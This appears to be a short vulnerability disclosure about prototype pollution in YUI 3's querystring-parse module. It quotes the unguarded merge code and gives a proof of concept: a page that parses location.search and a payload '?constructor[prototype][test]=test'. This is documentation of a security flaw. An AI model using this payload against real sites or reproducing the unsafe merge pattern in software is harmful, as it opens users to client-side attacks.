## YUI 3: Yahoo User Interface Library querystring-parse

URL: https://clarle.github.io/yui3/

### Vulnerable code fragment

https://github.com/yui/yui3/blob/25264e3629b1c07fb779d203c4a25c0879ec862c/src/querystring/js/querystring-parse.js#L46-L139

```js
pieceParser = function (eq) {
    return function parsePiece (key, val) {

        var sliced, numVal, head, tail, ret;

        if (arguments.length !== 2) {
            // key=val, called from the map/reduce
            key = key.split(eq);
            return parsePiece(
                QueryString.unescape(key.shift()),
                QueryString.unescape(key.join(eq))
            );
        }
        key = key.replace(/^\s+|\s+$/g, '');
        if (Y.Lang.isString(val)) {
            val = val.replace(/^\s+|\s+$/g, '');
            // convert numerals to numbers
            if (!isNaN(val)) {
                numVal = +val;
                if (val === numVal.toString(10)) {
                    val = numVal;
                }
            }
        }
        sliced = /(.*)\[([^\]]*)\]$/.exec(key);
        if (!sliced) {
            ret = {};
            if (key) {
                ret[key] = val;
            }
            return ret;
        }
        // ["foo[][bar][][baz]", "foo[][bar][]", "baz"]
        tail = sliced[2];
        head = sliced[1];

        // array: key[]=val
        if (!tail) {
            return parsePiece(head, [val]);
        }

        // obj: key[subkey]=val
        ret = {};
        ret[tail] = val;
        return parsePiece(head, ret);
    };
},

// the reducer function that merges each query piece together into one set of params
mergeParams = function(params, addition) {
    return (
        // if it's uncontested, then just return the addition.
        (!params) ? addition
        // if the existing value is an array, then concat it.
        : (Y.Lang.isArray(params)) ? params.concat(addition)
        // if the existing value is not an array, and either are not objects, arrayify it.
        : (!Y.Lang.isObject(params) || !Y.Lang.isObject(addition)) ? [params].concat(addition)
        // else merge them as objects, which is a little more complex
        : mergeObjects(params, addition)
    );
},

// Merge two *objects* together. If this is called, we've already ruled
// out the simple cases, and need to do the for-in business.
mergeObjects = function(params, addition) {
    for (var i in addition) {
        if (i && addition.hasOwnProperty(i)) {
            params[i] = mergeParams(params[i], addition[i]);
        }
    }
    return params;
};

/**
 * Accept Query Strings and return native JavaScript objects.
 *
 * @method parse
 * @param qs {String} Querystring to be parsed into an object.
 * @param sep {String} (optional) Character that should join param k=v pairs together. Default: "&"
 * @param eq  {String} (optional) Character that should join keys to their values. Default: "="
 * @public
 * @static
 */
QueryString.parse = function (qs, sep, eq) {
    // wouldn't Y.Array(qs.split()).map(pieceParser(eq)).reduce(mergeParams) be prettier?
    return Y.Array.reduce(
        Y.Array.map(
            qs.split(sep || "&"),
            pieceParser(eq || "=")
        ),
        {},
        mergeParams
    );
};         
```

### PoC
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/yui/3.18.1/yui/yui-min.js"></script>
<script>
YUI().use('querystring', function (Y) {
    Y.QueryString.parse(location.search.slice(1));
});
</script>
```
```
?constructor[prototype][test]=test
```